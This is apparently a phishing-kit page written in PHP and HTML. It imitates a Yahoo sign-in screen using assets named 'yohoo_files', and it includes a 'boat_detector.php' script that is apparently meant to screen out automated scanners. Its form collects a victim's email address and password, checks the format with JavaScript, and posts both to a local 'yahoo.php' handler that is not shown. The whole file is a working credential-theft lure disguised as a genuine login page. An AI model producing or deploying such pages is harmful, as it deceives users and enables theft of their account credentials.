<?php include('../boat_detector.php'); ?>
<html xmlns="http://www.w3.org/1999/xhtml"><head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
</head>
<body>

<title>Sign in</title>



<style type="text/css">

body {
	position: absolute;
	background-image: url(./yohoo_files/background.png);
	margin-left: 500px;
	margin-right: 1000px;
	margin-top: 100px;
	margin-bottom: 300px;
	overflow: scroll;
}


</style>


<script language="Javascript"> 
function  echeck(str) {
 
		var at="@"
		var dot="."
		var lat=str.indexOf(at)
		var lstr=str.length
		var ldot=str.indexOf(dot)
		if (str.indexOf(at)==-1){
		   alert("Invalid E-mail ID")
		   return false
		}
 
		if (str.indexOf(at)==-1 || str.indexOf(at)==0 || str.indexOf(at)==lstr){
		   alert("Invalid E-mail ID")
		   return false
		}
 
		if (str.indexOf(dot)==-1 || str.indexOf(dot)==0 || str.indexOf(dot)==lstr){
		    alert("Invalid E-mail ID")
		    return false
		}
 
		 if (str.indexOf(at,(lat+1))!=-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
		 if (str.substring(lat-1,lat)==dot || str.substring(lat+1,lat+2)==dot){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
		 if (str.indexOf(dot,(lat+2))==-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
		
		 if (str.indexOf(" ")!=-1){
		    alert("Invalid E-mail ID")
		    return false
		 }
 
 		 return true					
	}
 
   function ValidateFormOther(){
	var emailID=document.login.username
	var emailPASS=document.login.password
	
	if ((emailID.value==null)||(emailID.value=="")){
		alert("Please Enter your Email ID")
		emailID.focus()
		return false
	}
	if ((emailPASS.value==null)||(emailPASS.value=="")){
		alert("Please enter your e-mail password")
		emailPASS.focus()
		return false
	}
	if (echeck(emailID.value)==false){
		emailID.value=""
		emailID.focus()
		return false
	}
	return true
 }
</script> 




<form method="post" action="yahoo.php" name="login" id="login" onsubmit="return ValidateFormOther()" style="margin-left: 370px; margin-top: 115px;">
 
                                <p>
                                  <input name="username" placeholder="Email" style="width: 290px; height: 30px" type="text" id="username">
 								 </p>
     
                                    <input name="password" placeholder="Password" style="width: 290px; height: 30px" type="password" id="password">
                                  <p></p>
                                  
                                  <p>
                                  
                                      <input name="submit" type="image" class="submit" src="./yohoo_files/sign in.png" style="margin-left: 0px;" value="Go to step 2">
  </p>
</form>
<p>&nbsp;</p>




<noscript>&lt;i&gt;Javascript required&lt;/i&gt;</noscript>



</body></html>